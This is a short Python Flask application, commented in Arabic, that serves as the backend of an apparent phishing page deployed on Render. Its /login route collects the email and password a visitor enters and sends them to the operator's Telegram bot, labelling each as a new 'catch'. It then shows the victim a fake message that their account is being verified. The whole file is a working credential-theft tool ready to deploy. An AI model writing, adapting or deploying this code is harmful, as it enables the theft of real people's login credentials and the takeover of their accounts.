import os
import requests
from flask import Flask, render_template, request

app = Flask(__name__)

# --- جلب البيانات السرية من إعدادات Render (Environment Variables) ---
# تأكد أنك أضفت BOT_TOKEN و CHAT_ID في لوحة تحكم Render كما شرحنا
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

@app.route('/')
def home():
    # هذا الأمر يفتح صفحة index.html الاحترافية التي صممناها
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # جلب البيانات من خانات الإدخال في الصفحة
    email = request.form.get('email')
    password = request.form.get('password')
    
    # تجهيز رسالة التنبيه
    message = f"🚀 مختبر يانيس - صيد جديد!\n\n📧 الإيميل: {email}\n🔑 الباسورد: {password}"
    
    # إرسال البيانات إلى بوت التلغرام الخاص بك
    if BOT_TOKEN and CHAT_ID:
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        try:
            requests.post(telegram_url, data={'chat_id': CHAT_ID, 'text': message})
        except Exception as e:
            print(f"Error sending to Telegram: {e}")
    else:
        print("خطأ: لم يتم العثور على BOT_TOKEN أو CHAT_ID في إعدادات Render!")

    # توجيه المستخدم لصفحة نجاح وهمية لإتمام العملية
    return "<h1>Success!</h1><p>Your account is being verified. Please wait 24 hours.</p>"

if __name__ == '__main__':
    # إعداد المنفذ ليعمل بشكل صحيح على سيرفرات Render
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)